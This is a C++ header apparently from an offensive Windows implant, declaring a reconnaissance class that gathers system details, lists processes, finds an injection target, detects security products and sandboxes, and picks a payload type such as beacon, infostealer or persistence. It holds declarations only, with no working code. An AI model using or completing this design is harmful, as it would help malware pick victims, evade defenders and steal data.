#pragma once
#include <string>
#include <vector>
#include <Windows.h>
#include "Win32Helper.h"

// Prototypes for existing modules (assumed to be linked)
DWORD GetPidFromNtQueryFileInformationW(_In_ PWCHAR FullBinaryPath);
DWORD GetPidFromNtQuerySystemInformationW(_In_ PWCHAR BinaryNameWithFileExtension);
DWORD GetPidFromNtQuerySystemInformationA(_In_ PCHAR BinaryNameWithFileExtension);

struct SystemInfo {
    std::string os_version;
    std::string architecture;
    bool is_domain_joined;
    std::string username;
    std::string computer_name;
};

// Function Declarations for standalone usage
DWORD GetPidFromNtQuerySystemInformationW(PWCHAR BinaryNameWithFileExtension);
DWORD GetPidFromNtQueryFileInformationW(PWCHAR BinaryNameWithFileExtension);

struct ProcessInfo {
    DWORD pid;
    std::string name;
    DWORD session_id;
    bool is_system; // True if SessionId == 0
};

enum class IntegrityLevel {
    UNTRUSTED,
    LOW,
    MEDIUM,
    HIGH,
    SYSTEM,
    UNKNOWN
};

enum class PayloadType {
    BEACON,
    INFOSTEALER,
    PERSISTENCE,
    SILENT
};

class Footprinting {
public:
    Footprinting();
    
    // Gather basic system information
    SystemInfo GetSystemInfo();
    
    // Suggest the best payload based on environment
    PayloadType SuggestPayload();
    std::string GetPayloadName(PayloadType type);

    // Check if a specific process is running (using NtQuerySystemInformation)
    bool IsProcessRunning(const std::wstring& processName);
    
    // Get PID of a specific process
    DWORD GetProcessId(const std::wstring& processName);

    // Find a suitable target for injection
    DWORD FindInjectionTarget();

    // Check for presence of common security products (basic check)
    std::vector<std::string> GetSecurityProducts();

    // Get list of running processes with details
    std::vector<ProcessInfo> GetProcessList();

    // Advanced Reconnaissance
    IntegrityLevel GetIntegrityLevel();
    std::string GetIntegrityLevelName(IntegrityLevel level);
    bool IsSandbox();
    std::vector<std::string> GetInstalledSoftware();

private:
    std::string GetOSVersion();
    std::string GetArchitecture();
    bool CheckDomainJoinStatus();
};
